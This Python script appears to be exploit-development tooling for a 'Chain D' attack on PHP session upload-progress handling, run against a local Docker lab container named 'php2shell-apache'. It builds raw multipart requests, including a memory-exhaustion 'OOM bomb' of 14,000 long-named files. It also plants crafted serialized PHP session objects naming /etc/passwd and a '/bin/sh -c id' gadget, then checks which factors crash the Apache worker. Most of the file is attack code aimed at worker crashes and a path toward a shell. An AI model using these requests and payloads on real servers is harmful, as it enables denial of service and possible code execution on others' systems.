#!/usr/bin/env python3
"""
Chain D crash triage: isolate the exact cause of the worker segfault.

Test matrix:
  A. OOM → crafted session (objects) → follow-up   → KNOWN CRASH
  B. NO OOM → crafted session (objects) → follow-up → objects before RINIT?
  C. OOM → crafted session (no objects) → follow-up → stale state without objects?
  D. OOM → NO session file → follow-up              → stale state alone?
  E. OOM → crafted session (objects) → follow-up WITHOUT upload_progress → no rfc1867?

This tells us which factor(s) are necessary for the crash.
"""

import re
import socket
import subprocess
import sys
import time


def send_raw(host, port, data, timeout=60):
    s = socket.create_connection((host, port), timeout=timeout)
    off = 0
    while off < len(data):
        s.sendall(data[off:off+65536])
        off += 65536
    s.settimeout(15)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def get_status(resp):
    if resp:
        return resp.split(b"\r\n", 1)[0].decode("latin1", "replace")
    return "NO RESPONSE"


def build_multipart(host, boundary, sid, progress_key, num_files=5, fname_size=20):
    parts = []
    parts.append(
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n'
        f"\r\n{progress_key}\r\n"
    )
    for i in range(num_files):
        fname = chr(65 + (i % 26)) * max(1, fname_size - len(str(i))) + str(i)
        parts.append(
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="f{i}"; filename="{fname}"\r\n'
            f"Content-Type: application/octet-stream\r\n\r\nX\r\n"
        )
    parts.append(f"--{boundary}--\r\n")
    body = "".join(parts).encode("latin1")
    cookie = f"PHPSESSID={sid}"
    req = (
        f"POST /index.php HTTP/1.1\r\nHost: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\nCookie: {cookie}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body
    return req


def build_oom(host, boundary, sid, progress_key):
    return build_multipart(host, boundary, sid, progress_key,
                           num_files=14000, fname_size=500)


def build_simple_get(host, sid):
    return (
        f"GET /index.php HTTP/1.1\r\nHost: {host}\r\n"
        f"Cookie: PHPSESSID={sid}\r\nConnection: close\r\n\r\n"
    ).encode()


def write_session(sid, data):
    escaped = data.replace("\\", "\\\\").replace("'", "'\\''")
    subprocess.run(
        ["docker", "exec", "php2shell-apache", "bash", "-c",
         f"printf '%s' '{escaped}' > /tmp/sess_{sid} && "
         f"chown www-data:www-data /tmp/sess_{sid}"],
        capture_output=True, timeout=5)


def clear_sessions():
    subprocess.run(
        ["docker", "exec", "php2shell-apache", "bash", "-c", "rm -f /tmp/sess_*"],
        capture_output=True, timeout=5)


def get_worker_pid():
    r = subprocess.run(
        ["docker", "exec", "php2shell-apache", "bash", "-c",
         "pgrep -u www-data apache2 | head -1"],
        capture_output=True, text=True, timeout=5)
    pid = r.stdout.strip()
    return int(pid) if pid else None


def check_segfault_in_logs():
    r = subprocess.run(
        ["docker", "logs", "--tail", "5", "php2shell-apache"],
        capture_output=True, text=True, timeout=5)
    logs = r.stdout + r.stderr
    return any("Segmentation fault" in l or "signal 11" in l.lower()
               for l in logs.split("\n"))


def restart_apache():
    """Restart apache to get a clean worker."""
    subprocess.run(
        ["docker", "exec", "php2shell-apache", "apache2ctl", "graceful"],
        capture_output=True, timeout=5)
    time.sleep(1.5)


def run_test(label, host, port, boundary, sid,
             do_oom=True, session_data=None, followup_has_progress=True):
    """Run one test case and return whether the worker crashed."""
    print(f"\n{'─'*60}")
    print(f"  TEST {label}")
    print(f"{'─'*60}")

    restart_apache()
    clear_sessions()
    time.sleep(0.5)

    # Warm up
    send_raw(host, port, f"GET /index.php HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode())
    time.sleep(0.3)

    pid_before = get_worker_pid()
    print(f"  Worker PID: {pid_before}")

    # Step 1: Setup — normal upload_progress to establish session
    print(f"  [1] Setup request (upload_progress)...")
    req = build_multipart(host, boundary, sid, "setup_key")
    resp = send_raw(host, port, req)
    print(f"      Status: {get_status(resp)}")
    time.sleep(0.3)

    # Step 2: OOM (optional)
    if do_oom:
        print(f"  [2] OOM bomb...")
        req = build_oom(host, boundary, sid, "oom_key")
        resp = send_raw(host, port, req, timeout=120)
        print(f"      Status: {get_status(resp)}")
        time.sleep(0.5)
    else:
        print(f"  [2] (skipped — no OOM)")

    # Step 3: Write session file (optional)
    if session_data is not None:
        print(f"  [3] Writing session file ({len(session_data)} bytes)...")
        write_session(sid, session_data)
    else:
        print(f"  [3] (skipped — no session file write)")

    # Step 4: Follow-up
    if followup_has_progress:
        print(f"  [4] Follow-up (upload_progress)...")
        req = build_multipart(host, boundary, sid, "followup_key", num_files=3)
    else:
        print(f"  [4] Follow-up (simple GET, no upload_progress)...")
        req = build_simple_get(host, sid)

    resp = send_raw(host, port, req)
    status = get_status(resp)
    print(f"      Status: {status}")
    time.sleep(0.5)

    pid_after = get_worker_pid()
    crashed = (pid_after != pid_before) or ("NO RESPONSE" in status)
    segfault = check_segfault_in_logs()

    if crashed or segfault:
        print(f"  *** CRASH: PID {pid_before} → {pid_after}, segfault={segfault}")
    else:
        print(f"  OK: PID {pid_after} survived")

    return crashed or segfault


# Session payloads
OBJECTS_PAYLOAD = (
    'obj1|O:7:"Exploit":2:{s:4:"path";s:11:"/etc/passwd";s:3:"cmd";s:2:"id";}'
    'obj2|O:6:"Target":1:{s:4:"data";s:15:"AAAAAAAAAAAAA";}'
    'obj3|O:8:"Gadget01":3:{s:5:"shell";s:7:"/bin/sh";s:3:"arg";s:13:"-c id>/tmp/x";s:3:"env";N;}'
)

SCALAR_PAYLOAD = (
    'key1|s:5:"hello";'
    'key2|i:42;'
    'key3|a:2:{s:1:"a";s:1:"b";s:1:"c";s:1:"d";}'
)

LARGE_OBJECTS_PAYLOAD = ''.join(
    f'k{i}|O:{len(f"Cls{i:04d}")}:"{f"Cls{i:04d}"}":1:{{s:1:"x";s:100:"{"A"*100}";}}'
    for i in range(50)
)


def main():
    host = "127.0.0.1"
    port = 18081
    boundary = "TRIAGE"

    print("=" * 60)
    print("  Chain D: Crash Triage — Isolating the Cause")
    print("=" * 60)

    results = {}

    # Use clean alphanumeric session IDs (PHP rejects underscores)
    # Test A: OOM + objects + upload_progress (known crash)
    results["A"] = run_test(
        "A: OOM → objects → upload_progress (baseline)",
        host, port, boundary, "triageaaaaaaaaaaaaaaaaaa",
        do_oom=True, session_data=OBJECTS_PAYLOAD, followup_has_progress=True)

    # Test B: NO OOM + objects + upload_progress
    results["B"] = run_test(
        "B: NO OOM → objects → upload_progress",
        host, port, boundary, "triagebb0000000000000000",
        do_oom=False, session_data=OBJECTS_PAYLOAD, followup_has_progress=True)

    # Test C: OOM + scalars only + upload_progress
    results["C"] = run_test(
        "C: OOM → scalar session data → upload_progress",
        host, port, boundary, "triagecccccccccccccccccc",
        do_oom=True, session_data=SCALAR_PAYLOAD, followup_has_progress=True)

    # Test D: OOM + no session file + upload_progress
    results["D"] = run_test(
        "D: OOM → no session file → upload_progress",
        host, port, boundary, "triagedddddddddddddddddd",
        do_oom=True, session_data=None, followup_has_progress=True)

    # Test E: OOM + objects + simple GET (no upload_progress)
    results["E"] = run_test(
        "E: OOM → objects → simple GET (no rfc1867)",
        host, port, boundary, "triageeeeeeeeeeeeeeeeeee",
        do_oom=True, session_data=OBJECTS_PAYLOAD, followup_has_progress=False)

    # Test F: NO OOM + large objects + upload_progress
    results["F"] = run_test(
        "F: NO OOM → 50 large objects → upload_progress",
        host, port, boundary, "triageffffffffffffffffffff",
        do_oom=False, session_data=LARGE_OBJECTS_PAYLOAD, followup_has_progress=True)

    # Summary
    print(f"\n{'='*60}")
    print("  TRIAGE RESULTS")
    print(f"{'='*60}")
    for k, v in sorted(results.items()):
        print(f"  {k}: {'CRASH' if v else 'OK'}")

    print(f"\n  Analysis:")
    if results["A"] and not results["B"]:
        print("  OOM is REQUIRED for crash. Stale state from OOM is the trigger.")
    if results["A"] and not results["C"]:
        print("  Objects in session are REQUIRED. Scalar data is safe.")
    if results["A"] and not results["D"]:
        print("  Session file is REQUIRED. Stale EG alone is not enough.")
    if results["A"] and not results["E"]:
        print("  upload_progress (rfc1867) is REQUIRED. Session via PHP code is safe.")
    if results["B"]:
        print("  OOM is NOT required! Objects before RINIT crash on their own.")
    if results["F"]:
        print("  Many objects amplify the crash even without OOM.")

    return 0


if __name__ == "__main__":
    sys.exit(main())
